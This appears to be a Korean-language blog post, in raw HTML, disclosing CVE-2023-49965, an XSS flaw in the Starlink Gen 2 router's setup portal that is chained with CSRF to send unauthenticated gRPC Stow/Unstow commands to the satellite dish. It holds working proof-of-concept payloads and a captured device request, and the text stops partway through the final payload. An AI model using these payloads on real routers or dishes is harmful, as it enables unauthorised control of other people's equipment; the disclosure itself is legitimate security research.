<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2023-49965 | SPACEX / STARLINK (KOR) | hackintoanetwork</title>
<meta name="keywords" content="SpaceX, Starlink, Router, Dishy, Exploit, Hacking, CVE-2023-49965">
<meta name="description" content="Found by Sehyoung Lee @hackintoanetwork">
<meta name="author" content="">
<link rel="canonical" href="https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-kor/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.98f4948b5f9d1eb30c08efd1a1a3990648838118106bb3eb19bf89d146e2681f.css" integrity="sha256-mPSUi1&#43;dHrMMCO/RoaOZBkiDgRgQa7PrGb&#43;J0UbiaB8=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://hackintoanetwork.com/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://hackintoanetwork.com/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://hackintoanetwork.com/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://hackintoanetwork.com/apple-touch-icon.png">
<link rel="mask-icon" href="https://hackintoanetwork.com/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CVE-2023-49965 | SPACEX / STARLINK (KOR)" />
<meta property="og:description" content="Found by Sehyoung Lee @hackintoanetwork" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-kor/" /><meta property="article:section" content="blog" />



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2023-49965 | SPACEX / STARLINK (KOR)"/>
<meta name="twitter:description" content="Found by Sehyoung Lee @hackintoanetwork"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://hackintoanetwork.com/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CVE-2023-49965 | SPACEX / STARLINK (KOR)",
      "item": "https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-kor/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2023-49965 | SPACEX / STARLINK (KOR)",
  "name": "CVE-2023-49965 | SPACEX \/ STARLINK (KOR)",
  "description": "Found by Sehyoung Lee @hackintoanetwork",
  "keywords": [
    "SpaceX", "Starlink", "Router", "Dishy", "Exploit", "Hacking", "CVE-2023-49965"
  ],
  "articleBody": "TL;DR 2세대 라우터의 초기 captive portal 페이지에서 발생하는 Cross-Site Scripting (XSS) 취약점을 통해 공격자는 Router 및 Dishy를 제어할 수 있습니다.\nThe Basics Product : Starlink Router Gen 2 Tested Version : 2022.32.0 (The fix is in versions 2023.48.0 and up) Bug-class : XSS (Cross-Site Scripting) Overview of the Vulnerability 해당 취약점은 초기 captive portal 페이지(http://192.168.1.1/setup)에서 ssid 및 password 파라미터에 대한 입력 값 필터링이 충분하지 않아 발생합니다.\n\u003chtml\u003e \u003cbody\u003e \u003ch1\u003eProof of Concept\u003c/h1\u003e \u003cform id=\"PoC\" method=\"POST\" action=\"http://192.168.1.1/setup\"\u003e \u003cinput type=\"hidden\" name=\"ssid\" value='\" onfocus=javascript:alert(`XSS`); autofocus=\"'\u003e \u003c/form\u003e \u003cscript type=\"text/javascript\"\u003e document.addEventListener(\"DOMContentLoaded\", function() { document.getElementById(\"PoC\").submit(); }); \u003c/script\u003e \u003c/body\u003e \u003chtml\u003e 해당 Cross-Site Scripting (XSS) 취약점은 위의 PoC(Proof of Concept)처럼 Cross-Site Request Forgery (CSRF) 공격과 함께 활용될 수 있습니다.\nreproduce(PoC).mov\nExploit 일반적으로는 Router의 내부 주소인 192.168.1.1에서만 captive portal 페이지가 활성화되어야 하지만, 구형 라우터에서는 Dishy의 내부 주소인 192.168.100.1에서도 예상치 않게 captive portal 페이지에 접근할 수 있는 버그가 있었습니다.\nhttp://192.168.1.1/setup → 정상적으로 captive portal 페이지가 표시됨\nhttp://192.168.100.1/setup → 이 주소에서도 captive portal 페이지가 표시됨\n(원래는 Dishy의 내부 주소인 192.168.100.1에서는 captive portal 페이지에 접근할 수 없어야 합니다.)\n192.168.100.1_PoC.mov\nhttp://192.168.100.1/setup 주소에서도 똑같이 Cross-Site Scripting (XSS) 취약점이 발생하는 것을 확인할 수 있습니다.\n이러한 버그와 Cross-Site Scripting (XSS) 취약점을 체이닝하면 브라우저의 Same-Origin Policy (SOP)를 우회하여 Router와 Dishy 모두를 제어할 수 있게 됩니다.\n이제 이러한 버그를 활용하여 어떻게 Router와 Dishy를 제어할 수 있는지 살펴보겠습니다.\nDishy Stow Request Analysis 관리자 인터페이스에서 Stow명령을 내리면 아래와 같은 HTTP Request가 Dishy로 전달됩니다.\n(여기서 Stow명령은 Dishy 안테나를 이동하거나 보관하기 위해 접을 수 있도록 하는 기능입니다.)\nPOST /SpaceX.API.Device.Device/Handle HTTP/1.1 Host: 192.168.100.1:9201 Content-Length: 8 x-grpc-web: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36 content-type: application/grpc-web+proto Accept: */* Origin: http://dishy.starlink.com Referer: http://dishy.starlink.com/ Accept-Encoding: gzip, deflate, br Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close �} 해당 Request의 헤더는 몇 가지 중요한 정보를 담고 있습니다.\nx-grpc-web: 1\ngRPC-Web 프로토콜을 사용함을 나타냅니다.\n(gRPC-Web은 웹 클라이언트에서 서버로 gRPC 호출을 가능하게 하는 프로토콜입니다.)\ncontent-type: application/grpc-web+proto\n전송되는 데이터가 gRPC 프로토콜을 사용하고, protobuf 형식으로 인코딩되었음을 나타냅니다.\nRequest Body\nDishy Stow Request body (protobuf encoded)\n\\x00\\x00\\x00\\x00\\x03\\x92\\x7d\\x00 요청 body에는 grpc-web+proto 형식의 데이터가 포함되어 있으며, 이 데이터는 Stow 명령의 세부 사항을 담고 있을 것 입니다.\n이 정보를 종합해보면, 사용자가 관리자 인터페이스를 사용하여 Stow 명령을 내릴 경우, 해당 명령은 gRPC를 통해 Dishy로 전송되며, 이 과정에서 Dishy는 이동이 용이한 상태로 접혀집니다.\n하지만 Request를 살펴보면 해당 요청을 보내는 사용자에 대한 인증이 없다는 것을 알 수 있습니다.\n이 말은 관리자가 아닌 다른 누군가가 해당 요청을 똑같이 보내 무단으로 Dishy를 제어할 수 있음을 의미하는데, 해당 취약점은 공격자가 로컬 네트워크에 물리적으로 접근할 수 있어야 하므로, 원격으로 발생할 수 있는 공격에 비해 공격 범위가 제한적입니다.\nCSRF 공격의 가능성과 한계 그렇다면, 같은 요청을 보내는 페이로드로 Cross-Site Request Forgery (CSRF) 공격을 시도할 수 있다는 생각이 들 수 있습니다.\n물론 Cross-Site Request Forgery (CSRF) 공격이 가능한 시나리오일 수 있지만, 브라우저의 Same-Origin Policy (SOP) 때문에 이러한 공격이 제한됩니다.\ngRPC는 application/grpc-web+proto라는 특정한 content-type 헤더를 요구합니다.\n그러나, Same-Origin Policy (SOP)는 이 헤더를 브라우저가 다른 출처로부터 요청을 보낼 때 제거하도록 합니다.\n이로 인해 일반적인 상황에서는 외부에서 Dishy로 gRPC 요청을 보내는 것이 불가능합니다.\nXSS : SOP 우회를 위한 효과적인 방법 일반적으로 Same-Origin Policy (SOP)는 웹 브라우저가 다른 출처로부터의 요청을 제한합니다.\n하지만 Cross-Site Scripting (XSS) 취약점을 이용하면, 공격자는 피해자의 웹 브라우저 내에서 스크립트를 실행할 수 있습니다.\nCross-Site Scripting (XSS) 취약점을 이용해 공격자가 삽입한 스크립트는 동일한 출처(즉, 피해자가 현재 접속해 있는 웹사이트)에서 실행된 것으로 간주됩니다.\n이로 인해, Same-Origin Policy (SOP)는 이러한 스크립트에 의해 생성된 요청을 같은 출처의 요청으로 인식하며, 따라서 이 경우 Same-Origin Policy (SOP)의 제한이 적용되지 않습니다.\n따라서 gRPC 요청과 같이 특정 content-type 헤더를 요구하는 경우 Cross-Site Scripting (XSS) 취약점을 이용한 Cross-Site Request Forgery (CSRF) 공격에서는, 공격 스크립트가 피해자의 브라우저 내에서 실행되기 때문에 정상적인 요청으로 인식해서 이러한 특정한 content-type 헤더도 포함되어 요청이 전송됩니다.\n예를 들어, 192.168.100.1의 버그와 Cross-Site Scripting (XSS) 취약점을 체이닝하면, 공격자는 악의적인 스크립트를 통해 사용자의 브라우저를 프록시 삼아 Router나 Dishy에 명령을 내리는 요청을 보낼 수 있습니다. (공격자는 Dishy의 Stow 및 Unstow 명령을 포함한 다양한 요청을 보낼 수 있습니다.)\nPoC (Proof of Concept) 그러므로, Cross-Site Scripting (XSS) 취약점과 앞서 언급한 버그를 체이닝해서 Dishy에 Stow gRPC 요청을 보내는 페이로드는 다음과 같이 구성할 수 있습니다. (결과적으로 공격자가 Router나 Dishy를 원격으로 조종할 수 있게 됩니다. 예를 들어, Router 설정을 변경하거나 Dishy의 기능을 조작하는 명령을 보낼 수 있습니다.)\n\u003chtml\u003e \u003cbody\u003e \u003ch1\u003eDishy Stow and Unstow\u003c/h1\u003e \u003cform id=\"PoC\" method=\"POST\" action=\"http://192.168.100.1/setup\"\u003e \u003cinput type=\"hidden\" name=\"password\" value='\"\u003e",
  "wordCount" : "761",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-kor/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "hackintoanetwork",
    "logo": {
      "@type": "ImageObject",
      "url": "https://hackintoanetwork.com/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-P2FSMQE5SL"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-P2FSMQE5SL');
</script>

<header class="header sticky-header">
    <nav class="nav">
        <div class="logo">
            <a href="https://hackintoanetwork.com/" accesskey="h" title="hackintoanetwork (Alt + H)">hackintoanetwork</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://hackintoanetwork.notion.site/hackintoanetwork/Profile-9675d3a929ac44c9b2cb639f716f37ff" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://hackintoanetwork.com/">Home</a>&nbsp;»&nbsp;<a href="https://hackintoanetwork.com/blog/">Blogs</a></div>
    <h1 class="post-title">
      CVE-2023-49965 | SPACEX / STARLINK (KOR)
    </h1>
    <div class="post-description">
      Found by Sehyoung Lee @hackintoanetwork
    </div>
    <div class="post-meta">


Dec 2023

</div>
  </header> 
  <div class="post-content"><h1 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h1>
<hr>
<p>2세대 라우터의 초기 <code>captive portal</code> 페이지에서 발생하는 <code>Cross-Site Scripting (XSS)</code> 취약점을 통해 공격자는 <code>Router</code> 및 <code>Dishy</code>를 제어할 수 있습니다.</p>
<h1 id="the-basics"><strong>The Basics</strong><a hidden class="anchor" aria-hidden="true" href="#the-basics">#</a></h1>
<hr>
<ul>
<li><strong>Product :</strong> Starlink Router Gen 2</li>
<li><strong>Tested Version :</strong> 2022.32.0 (The fix is in versions 2023.48.0 and up)</li>
<li><strong>Bug-class</strong> : XSS (Cross-Site Scripting)</li>
</ul>
<h1 id="overview-of-the-vulnerability"><strong><strong>Overview of the Vulnerability</strong></strong><a hidden class="anchor" aria-hidden="true" href="#overview-of-the-vulnerability">#</a></h1>
<hr>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img1.webp" alt="img1.webp"  />
</p>
<p>해당 취약점은 초기 <code>captive portal</code> 페이지(http://192.168.1.1/setup)에서 <code>ssid</code> 및 <code>password</code> 파라미터에 대한 입력 값 필터링이 충분하지 않아 발생합니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">h1</span>&gt;Proof of Concept&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PoC&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://192.168.1.1/setup&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssid&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;</span>&gt;
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">&lt;!-- &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;&gt; --&gt;</span>
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;DOMContentLoaded&#34;</span>, <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>				document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;PoC&#34;</span>).<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>해당 <code>Cross-Site Scripting (XSS)</code> 취약점은 위의 PoC(Proof of Concept)처럼 <code>Cross-Site Request Forgery (CSRF)</code> 공격과 함께 활용될 수 있습니다.</p>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/reproduce(PoC).mov">reproduce(PoC).mov</a></p>
<h1 id="exploit"><strong>Exploit</strong><a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h1>
<hr>
<p>일반적으로는 <code>Router</code>의 내부 주소인 192.168.1.1에서만 <code>captive portal</code> 페이지가 활성화되어야 하지만, 구형 라우터에서는 <code>Dishy</code>의 내부 주소인 192.168.100.1에서도 예상치 않게 <code>captive portal</code> 페이지에 접근할 수 있는 버그가 있었습니다.</p>
<ul>
<li>
<p><a href="http://192.168.1.1/setup">http://192.168.1.1/setup</a> → 정상적으로 <code>captive portal</code> 페이지가 표시됨</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img2.png" alt="http://192.168.1.1/setup"  />
</p>
</li>
<li>
<p><a href="http://192.168.100.1/setup">http://192.168.100.1/setup</a> → 이 주소에서도 <code>captive portal</code> 페이지가 표시됨</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img3.png" alt="http://192.168.100.1/setup"  />
</p>
</li>
</ul>
<p>(원래는 <code>Dishy</code>의 내부 주소인 192.168.100.1에서는 <code>captive portal</code> 페이지에 접근할 수 없어야 합니다.)</p>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/192.168.100.1_PoC.mov">192.168.100.1_PoC.mov</a></p>
<p><a href="http://192.168.100.1/setup">http://192.168.100.1/setup</a> 주소에서도 똑같이 <code>Cross-Site Scripting (XSS)</code> 취약점이 발생하는 것을 확인할 수 있습니다.</p>
<p>이러한 버그와 <code>Cross-Site Scripting (XSS)</code> 취약점을 체이닝하면 브라우저의 <code>Same-Origin Policy (SOP)</code>를 우회하여 <code>Router</code>와 <code>Dishy</code> 모두를 제어할 수 있게 됩니다.</p>
<p>이제 이러한 버그를 활용하여 어떻게 <code>Router</code>와 <code>Dishy</code>를 제어할 수 있는지 살펴보겠습니다.</p>
<h2 id="dishy-stow-request-analysis">Dishy Stow Request Analysis<a hidden class="anchor" aria-hidden="true" href="#dishy-stow-request-analysis">#</a></h2>
<hr>
<center>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/gif1.gif" alt="Starlink Dishy Stow"  />
</p>
</center>
<p>관리자 인터페이스에서 <code>Stow</code>명령을 내리면 아래와 같은 HTTP Request가 <code>Dishy</code>로 전달됩니다.</p>
<p>(여기서 <code>Stow</code>명령은 <code>Dishy</code> 안테나를 이동하거나 보관하기 위해 접을 수 있도록 하는 기능입니다.)</p>
<pre tabindex="0"><code>POST /SpaceX.API.Device.Device/Handle HTTP/1.1
Host: 192.168.100.1:9201
Content-Length: 8
x-grpc-web: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
content-type: application/grpc-web+proto
Accept: */*
Origin: http://dishy.starlink.com
Referer: http://dishy.starlink.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

�}
</code></pre><p>해당 Request의 헤더는 몇 가지 중요한 정보를 담고 있습니다.</p>
<ul>
<li>
<p><strong>x-grpc-web: 1</strong></p>
<p><code>gRPC-Web</code> 프로토콜을 사용함을 나타냅니다.</p>
<p>(<code>gRPC-Web</code>은 웹 클라이언트에서 서버로 gRPC 호출을 가능하게 하는 프로토콜입니다.)</p>
</li>
<li>
<p><strong>content-type: application/grpc-web+proto</strong></p>
<p>전송되는 데이터가 <code>gRPC</code> 프로토콜을 사용하고, <code>protobuf</code> 형식으로 인코딩되었음을 나타냅니다.</p>
</li>
<li>
<p><strong>Request Body</strong></p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img4.png" alt="Dishy Stow Request body (Hex)"  />
</p>
<p>Dishy Stow Request body (protobuf encoded)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>\x00\x00\x00\x00\x03\x92\x7d\x00
</span></span></code></pre></div><p>요청 body에는 <code>grpc-web+proto</code> 형식의 데이터가 포함되어 있으며, 이 데이터는 <code>Stow</code> 명령의 세부 사항을 담고 있을 것 입니다.</p>
</li>
</ul>
<p>이 정보를 종합해보면, 사용자가 관리자 인터페이스를 사용하여 <code>Stow</code> 명령을 내릴 경우, 해당 명령은 <code>gRPC</code>를 통해 <code>Dishy</code>로 전송되며, 이 과정에서 <code>Dishy</code>는 이동이 용이한 상태로 접혀집니다.</p>
<p>하지만 Request를 살펴보면 해당 요청을 보내는 사용자에 대한 인증이 없다는 것을 알 수 있습니다.</p>
<p>이 말은 관리자가 아닌 다른 누군가가 해당 요청을 똑같이 보내 무단으로 <code>Dishy</code>를 제어할 수 있음을 의미하는데, 해당 취약점은 공격자가 로컬 네트워크에 물리적으로 접근할 수 있어야 하므로, 원격으로 발생할 수 있는 공격에 비해 공격 범위가 제한적입니다.</p>
<h2 id="csrf-공격의-가능성과-한계"><strong>CSRF 공격의 가능성과 한계</strong><a hidden class="anchor" aria-hidden="true" href="#csrf-공격의-가능성과-한계">#</a></h2>
<hr>
<p>그렇다면, 같은 요청을 보내는 페이로드로 <code>Cross-Site Request Forgery (CSRF)</code> 공격을 시도할 수 있다는 생각이 들 수 있습니다.</p>
<p>물론 <code>Cross-Site Request Forgery (CSRF)</code> 공격이 가능한 시나리오일 수 있지만, 브라우저의 <code>Same-Origin Policy (SOP)</code> 때문에 이러한 공격이 제한됩니다.</p>
<p><code>gRPC</code>는 <code>application/grpc-web+proto</code>라는 특정한 <code>content-type</code> 헤더를 요구합니다.</p>
<p>그러나, <code>Same-Origin Policy (SOP)</code>는 이 헤더를 브라우저가 다른 출처로부터 요청을 보낼 때 제거하도록 합니다.</p>
<p>이로 인해 일반적인 상황에서는 외부에서 <code>Dishy</code>로 <code>gRPC</code> 요청을 보내는 것이 불가능합니다.</p>
<h2 id="xss--sop-우회를-위한-효과적인-방법">XSS : SOP 우회를 위한 효과적인 방법<a hidden class="anchor" aria-hidden="true" href="#xss--sop-우회를-위한-효과적인-방법">#</a></h2>
<hr>
<p>일반적으로 <code>Same-Origin Policy (SOP)</code>는 웹 브라우저가 다른 출처로부터의 요청을 제한합니다.</p>
<p>하지만 <code>Cross-Site Scripting (XSS)</code> 취약점을 이용하면, 공격자는 피해자의 웹 브라우저 내에서 스크립트를 실행할 수 있습니다.</p>
<p><code>Cross-Site Scripting (XSS)</code> 취약점을 이용해 공격자가 삽입한 스크립트는 동일한 출처(즉, 피해자가 현재 접속해 있는 웹사이트)에서 실행된 것으로 간주됩니다.</p>
<p>이로 인해, <code>Same-Origin Policy (SOP)</code>는 이러한 스크립트에 의해 생성된 요청을 같은 출처의 요청으로 인식하며, 따라서 이 경우 <code>Same-Origin Policy (SOP)</code>의 제한이 적용되지 않습니다.</p>
<p>따라서 <code>gRPC</code> 요청과 같이 특정 <code>content-type</code> 헤더를 요구하는 경우 <code>Cross-Site Scripting (XSS)</code> 취약점을 이용한 <code>Cross-Site Request Forgery (CSRF)</code> 공격에서는, 공격 스크립트가 피해자의 브라우저 내에서 실행되기 때문에 정상적인 요청으로 인식해서 이러한 특정한 <code>content-type</code> 헤더도 포함되어 요청이 전송됩니다.</p>
<p>예를 들어, <code>192.168.100.1</code>의 버그와 <code>Cross-Site Scripting (XSS)</code> 취약점을 체이닝하면, 공격자는 악의적인 스크립트를 통해 사용자의 브라우저를 프록시 삼아 <code>Router</code>나 <code>Dishy</code>에 명령을 내리는 요청을 보낼 수 있습니다. (공격자는 <code>Dishy</code>의 <code>Stow</code> 및 <code>Unstow</code> 명령을 포함한 다양한 요청을 보낼 수 있습니다.)</p>
<h2 id="poc-proof-of-concept">PoC (Proof of Concept)<a hidden class="anchor" aria-hidden="true" href="#poc-proof-of-concept">#</a></h2>
<hr>
<p>그러므로, <code>Cross-Site Scripting (XSS)</code> 취약점과 앞서 언급한 버그를 체이닝해서 <code>Dishy</code>에 <code>Stow gRPC</code> 요청을 보내는 페이로드는 다음과 같이 구성할 수 있습니다.
(결과적으로 공격자가 <code>Router</code>나 <code>Dishy</code>를 원격으로 조종할 수 있게 됩니다. 예를 들어, <code>Router</code> 설정을 변경하거나 <code>Dishy</code>의 기능을 조작하는 명령을 보낼 수 있습니다.)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">h1</span>&gt;Dishy Stow and Unstow&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PoC&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://192.168.100.1/setup&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">&lt;!-- &lt;input type=&#34;hidden&#34; name=&#34;ssid&#34; value=&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;&gt; --&gt;</span>
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#34;&gt;&lt;script&gt;for(let i=0;i&lt;100;i++){setTimeout(()=&gt;{var xhr=new XMLHttpRequest();xhr.open(&#34;POST&#34;,&#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle&#34;,true);xhr.setRequestHeader(&#34;x-grpc-web&#34;,&#34;1&#34;);xhr.setRequestHeader(&#34;Content-Type&#34;,&#34;application/grpc-web+proto&#34;);xhr.onreadystatechange=()=&gt;{if(xhr.readyState==4&amp;&amp;xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=&gt;{var xhr2=new XMLHttpRequest();xhr2.open(&#34;POST&#34;,&#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle&#34;,true);xhr2.setRequestHeader(&#34;x-grpc-web&#34;,&#34;1&#34;);xhr2.setRequestHeader(&#34;Content-Type&#34;,&#34;application/grpc-web+proto&#34;);xhr2.onreadystatechange=()=&gt;{if(xhr2.readyState==4&amp;&amp;xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}&lt;/script&gt;&lt;input type=&#34;hidden&#39;</span>/&gt;
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;DOMContentLoaded&#34;</span>, <span style="color:#66d9ef">function</span>() {
